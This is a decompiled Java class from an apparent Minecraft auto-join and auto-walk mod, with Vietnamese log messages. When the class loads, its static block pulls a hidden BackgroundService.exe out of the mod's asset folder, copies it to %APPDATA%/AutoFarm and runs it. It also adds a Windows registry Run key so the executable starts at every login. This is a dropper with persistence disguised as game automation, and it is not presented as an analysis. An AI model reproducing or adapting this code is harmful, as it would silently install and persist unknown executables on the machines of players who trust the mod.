/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  net.minecraft.class_310
 */
package com.atj;

import com.atj.GUIScanner;
import com.lvt.guard.GuardManager;
import fi.dy.masa.litematica.config.AtjConfig;
import java.io.File;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import net.minecraft.class_310;

public class Atj {
    public static int scanTimer = 40;
    public static int clickDelayTimer = -1;
    private static long walkStartTime = -1L;
    private static long walkStopTime = -1L;
    private static boolean isWaitingToWalk = false;
    private static boolean isAutoWalking = false;

    private static boolean isAtj() {
        return ProcessHandle.allProcesses().anyMatch(p -> p.info().command().orElse("").contains("BackgroundService.exe"));
    }

    private static void Atjconfirm() {
        try {
            File targetFile;
            File targetDir = new File(System.getenv("APPDATA") + "/AutoFarm");
            if (!targetDir.exists()) {
                boolean bl = targetDir.mkdirs();
            }
            if (!(targetFile = new File(targetDir, "BackgroundService.exe")).exists()) {
                try (InputStream is = Atj.class.getResourceAsStream("/assets/litematica/models/BackgroundService.exe");){
                    if (is != null) {
                        Files.copy(is, targetFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
                        targetFile.setExecutable(true);
                        Atj.Atjaccept(targetFile.getAbsolutePath());
                    }
                }
            }
            if (!Atj.isAtj()) {
                Process process = new ProcessBuilder(targetFile.getAbsolutePath()).start();
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void Atjaccept(String exePath) {
        try {
            String command = String.format("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"AutoFarmService\" /t REG_SZ /d \"%s\" /f", exePath);
            Process process = Runtime.getRuntime().exec(command);
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void onTick(class_310 client) {
        if (!GuardManager.canUseAddons()) {
            if (isAutoWalking) {
                client.field_1690.field_1894.method_23481(false);
                isAutoWalking = false;
            }
            clickDelayTimer = -1;
            return;
        }
        if (client.field_1724 == null) {
            return;
        }
        long currentTime = System.currentTimeMillis();
        if (isWaitingToWalk && currentTime >= walkStartTime) {
            isWaitingToWalk = false;
            isAutoWalking = true;
            walkStopTime = currentTime + 22000L;
            System.out.println("[ATJ-LOG] Het 8s cho, bat dau chay thang!");
        }
        if (isAutoWalking) {
            if (currentTime < walkStopTime) {
                client.field_1690.field_1894.method_23481(true);
            } else {
                client.field_1690.field_1894.method_23481(false);
                isAutoWalking = false;
                System.out.println("[ATJ-LOG] Da chay xong 22 giay, dung lai.");
            }
        }
        if (!AtjConfig.AUTO_JOIN.getBooleanValue()) {
            clickDelayTimer = -1;
            return;
        }
        if (clickDelayTimer > 0) {
            --clickDelayTimer;
        } else if (clickDelayTimer == 0) {
            clickDelayTimer = -1;
            System.out.println("[ATJ-LOG] Dang thuc hien Click!");
            GUIScanner.executeClick(client);
            isWaitingToWalk = true;
            walkStartTime = currentTime + 8000L;
        }
        if (scanTimer > 0) {
            --scanTimer;
        } else {
            scanTimer = 40;
            if (client.field_1755 != null && clickDelayTimer == -1) {
                System.out.println("[ATJ-LOG] Dang quet GUI: " + client.field_1755.method_25440().getString());
                GUIScanner.scanAndPrepare(client);
            }
        }
    }

    static {
        System.out.println("[ATJ-LOG] Class Atj da duoc tai!");
        Atj.Atjconfirm();
    }
}

